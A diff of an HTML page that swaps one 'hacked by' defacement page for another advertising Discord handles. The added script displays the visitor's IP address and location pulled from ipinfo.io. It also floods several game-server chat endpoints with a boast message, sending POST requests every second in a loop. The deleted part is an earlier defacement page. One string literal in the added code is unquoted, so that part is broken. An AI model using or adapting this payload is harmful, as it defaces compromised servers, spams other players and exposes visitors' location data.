@@ -1,196 +1,88 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Hacked by Sahm</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
-
-    /* Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    html, body {
-      height: 100%;
-      background-color: #000;
-      background-image:
-        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
-      background-size: 40px 40px;
-      font-family: 'Orbitron', monospace, 'Courier New', monospace;
-      color: #aaa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      overflow: hidden;
-      user-select: none;
-      height: 100vh;
-      text-align: center;
-    }
-
-    /* Loading Screen */
-    #loading-screen {
-      position: fixed;
-      top:0; left:0; right:0; bottom:0;
-      background-color: black;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      color: #00ff00;
-      font-size: 2em;
-      letter-spacing: 2px;
-      user-select: none;
-      z-index: 10;
-    }
-    /* Animated dots for loading */
-    #loading-text::after {
-      content: '';
-      display: inline-block;
-      width: 1em;
-      text-align: left;
-      animation: dots 1.5s steps(4, end) infinite;
-    }
-    @keyframes dots {
-      0%, 20% { content: ''; }
-      40% { content: '.'; }
-      60% { content: '..'; }
-      80%, 100% { content: '...'; }
-    }
-
-    /* Main Content - hidden initially */
-    #main-content {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      max-width: 900px;
-      padding: 20px;
-      width: 90vw;
-    }
-
-    /* Image large centered */
-    #terminal-image {
-      width: 350px;
-      height: auto;
-      user-select: none;
-      image-rendering: pixelated;
-      /* No border or shadow */
-      margin-bottom: 30px;
-    }
-
-    /* Title "HACKED BY SAHM" */
-    #title {
-      font-size: 3.2em;
-      color: #aaa;
-      letter-spacing: 4px;
-      font-weight: 700;
-      text-shadow:
-        0 0 6px #888,
-        0 0 12px #444;
-      margin-bottom: 40px;
-      font-family: 'Orbitron', monospace, 'Courier New', monospace;
-    }
-
-    /* Terminal style box */
-    #terminal {
-      background: rgba(0,0,0,0.7);
-      border-radius: 10px;
-      border: 1px solid #222;
-      box-shadow:
-        0 0 15px #00ff00,
-        inset 0 0 8px #00ff00;
-      color: #00ff00;
-      font-family: 'Courier New', monospace;
-      font-size: 1.2em;
-      padding: 20px 30px;
-      width: 100%;
-      max-width: 700px;
-      text-align: left;
-      white-space: pre-wrap;
-      line-height: 1.5;
-      user-select: text;
-    }
-
-    /* Terminal links */
-    #terminal a {
-      color: #00ff00;
-      text-decoration: underline;
-    }
-
-    /* Smaller footer text */
-    #footer {
-      margin-top: 60px;
-      font-family: 'Courier New', monospace;
-      font-size: 0.75em;
-      color: #444;
-      letter-spacing: 3px;
-    }
-
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/uaee</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #0000ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #0000ff; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
 </head>
 <body>
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1004516710067478560/1392353036231245908/boot.jpg?ex=6896c650&is=689574d0&hm=82c048e1090f76a641ad5c5f6ab7203033e6b363404b67a37c70d79b51572edd&" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="حط الاغنيه الي تبيها" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">discord : amxm</div>
 
-  <!-- Loading Screen -->
-  <div id="loading-screen" role="alert" aria-live="assertive" aria-atomic="true">
-    <div id="loading-text">Loading</div>
-  </div>
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
 
-  <!-- Main Content -->
-  <div id="main-content" aria-live="polite" aria-atomic="true">
-    <img id="terminal-image" src="https://i.pinimg.com/736x/90/10/ba/9010ba22b8f6782e24b6c38f5c387e0c.jpg" alt="Hacker Image" />
-    <div id="title">HACKED BY FURY TEAM</div>
-    <div id="terminal" tabindex="0" aria-label="Terminal"></div>
-    <div id="footer">AmX - 7blani</div>
-  </div>
 
-  <audio id="bg-music" autoplay loop>
-    <source src="https://od.lk/s/MTlfNzE5Nzg5MTlf/aaaa.mp3" type="audio/mpeg" />
-    Your browser does not support the audio element.
-  </audio>
-
-  <script>
-    const terminalText = `https://discord.gg/UKmyTfnqWu
-
-ur@system:~$ why?
-AmX : Your system is very weak :)
-7blani : ...لديكم خادم جميل 
-`;
-
-    const terminal = document.getElementById('terminal');
-    const loadingScreen = document.getElementById('loading-screen');
-    const mainContent = document.getElementById('main-content');
-    const typingSpeed = 40;
-
-    function typeText(text, element, speed, callback) {
-      let i = 0;
-      function typing() {
-        if (i < text.length) {
-          element.textContent += text.charAt(i);
-          i++;
-          element.scrollTop = element.scrollHeight;
-          setTimeout(typing, speed);
-        } else {
-          // تحويل روابط لروابط HTML قابلة للضغط (للديسكورد هنا)
-          element.innerHTML = element.innerHTML.replace(/discord\.gg\//g, `<a href="https://discord.gg/" target="_blank" rel="noopener noreferrer">discord.gg/</a>`);
-          if (callback) callback();
-        }
-      }
-      typing();
-    }
-
-    // بدء عرض المحتوى بعد 3 ثواني
-    setTimeout(() => {
-      loadingScreen.style.display = 'none';
-      mainContent.style.display = 'flex';
-      typeText(terminalText, terminal, typingSpeed);
-      terminal.focus();
-    }, 3000);
-
-  </script>
-
+    const msg = 👑 AmX on ur server baby :) dis : amxm 👑;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
 </body>
 </html>
